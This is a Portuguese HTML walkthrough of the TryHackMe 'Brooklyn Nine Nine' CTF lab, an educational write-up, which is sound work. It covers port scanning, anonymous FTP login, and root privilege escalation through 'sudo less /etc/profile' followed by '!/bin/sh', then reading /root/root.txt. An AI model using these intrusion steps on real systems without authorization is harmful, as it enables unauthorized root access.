<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brooklyn Nine Nine - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>BROOKLYN NINE NINE</h1>
            <p class="subtitle">Walkthrough da sala do TryHackMe</p>
        </header>
        
        <section class="intro">
            <h2>Sala Brooklyn Nine Nine</h2>
            <p>Esta é uma sala de CTF (Capture The Flag) do TryHackMe com tema da série Brooklyn Nine-Nine. O objetivo é encontrar flags escondidas explorando vulnerabilidades no sistema.</p>
            
            <a href="https://tryhackme.com/room/brooklynninenine" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Sala no TryHackMe
            </a>
            
            <div class="image-container">
                <img src="../img/code.jpg" alt="Imagem de código relacionado ao CTF">
                <div class="image-caption">Exemplo de código e técnicas de exploração</div>
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sC -sV -A &lt;TARGET_IP&gt;
                </div>
                
                <div class="image-container">
                    <img src="../img/almoco.jpg" alt="Resultado do escaneamento de portas">
                    <div class="image-caption">Resultado do comando nmap mostrando portas abertas</div>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Acesso FTP</h3>
                </div>
                <p>O escaneamento revela um serviço FTP aberto. Tente acessar com credenciais anonymous:</p>
                <div class="code">
                    ftp &lt;TARGET_IP&gt;<br>
                    Name: anonymous<br>
                    Password: (deixe em branco ou use anonymous)
                </div>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Conexão FTP bem-sucedida">
                    <div class="image-caption">Conexão FTP bem-sucedida com acesso anonymous</div>
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração e Busca por Flags</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Navegação no FTP</h3>
                </div>
                <p>Após conectar via FTP, navegue pelos diretórios e procure por arquivos interessantes:</p>
                <div class="code">
                    ls -la<br>
                    cd [diretórios]<br>
                    get [arquivos]
                </div>
                <p>Procurar entre pastas até achar arquivos contendo flags ou informações sensíveis.</p>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Listagem de diretórios FTP">
                    <div class="image-caption">Listagem de diretórios no servidor FTP</div>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Verificação de Privilégios Sudo</h3>
                </div>
                <p>Após obter acesso ao sistema, verifique quais comandos podem ser executados com sudo:</p>
                <div class="code">
                    sudo -l
                </div>
                <p>O comando <code>sudo –l</code> mostra os comandos que um usuário pode executar com sudo sem saber a senha.</p>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Resultado do comando sudo -l">
                    <div class="image-caption">Resultado do comando sudo -l mostrando comandos permitidos</div>
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Exploração do GTFOBins</h3>
                </div>
                <p>Acesse o GTFOBins para encontrar maneiras de explorar comandos disponíveis no sudo:</p>
                <a href="https://gtfobins.github.io/" target="_blank" class="example-link">
                    <i class="fas fa-external-link-alt"></i> Acessar GTFOBins
                </a>
                <p>Procure por sudo com less que era um dos comandos disponíveis.</p>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Página do GTFOBins para o comando less">
                    <div class="image-caption">Página do GTFOBins mostrando exploração do comando less</div>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Exploração do Comando Less</h3>
                </div>
                <p>Execute o comando less com privilégios sudo e explore a escalação de privilégios:</p>
                <div class="code">
                    sudo less /etc/profile
                </div>
                <p>Dentro do less, insira o comando <code>!/bin/sh</code> para obter um shell com privilégios elevados.</p>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Exploração do comando less">
                    <div class="image-caption">Exploração do comando less para obter shell root</div>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Busca pela Flag Final</h3>
                </div>
                <p>Após obter shell root, procure pela flag final no sistema:</p>
                <div class="code">
                    find / -name "*.txt" -o -name "root.txt" -o -name "flag.txt" 2>/dev/null<br>
                    cat /root/root.txt
                </div>
                <p>Sai e procure a última flag.</p>
                
                <div class="image-container">
                    <img src="../img/code.jpg" alt="Flag final encontrada">
                    <div class="image-caption">Flag final encontrada no diretório /root/</div>
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos Úteis</h2>
            
            <div class="code">
                # Conexão FTP<br>
                ftp &lt;IP&gt;<br>
                Name: anonymous<br>
                Password: [vazio ou anonymous]<br><br>
                
                # Verificar privilégios sudo<br>
                sudo -l<br><br>
                
                # Explorar comando less para escalação<br>
                sudo less /etc/profile<br>
                !/bin/sh<br><br>
                
                # Procurar flags<br>
                find / -name "*flag*" -o -name "*.txt" 2>/dev/null<br>
                find / -user root -name "*.txt" 2>/dev/null
            </div>
        </section>
        
        <section class="section">
            <h2>Resumo das Flags</h2>
            
            <table>
                <tr>
                    <th>Flag</th>
                    <th>Localização</th>
                    <th>Método de Obtenção</th>
                </tr>
                <tr>
                    <td>Flag 1</td>
                    <td>Serviço FTP</td>
                    <td>Acesso anonymous e navegação</td>
                </tr>
                <tr>
                    <td>Flag 2</td>
                    <td>Diretório do usuário</td>
                    <td>Exploração do sistema</td>
                </tr>
                <tr>
                    <td>Flag 3 (root)</td>
                    <td>/root/</td>
                    <td>Escalação de privilégios via sudo</td>
                </tr>
            </table>
        </section>
        
        <footer>
            <p>Walkthrough educativo da sala Brooklyn Nine Nine do TryHackMe | CTF e Pentesting</p>
        </footer>
    </div>
</body>
</html>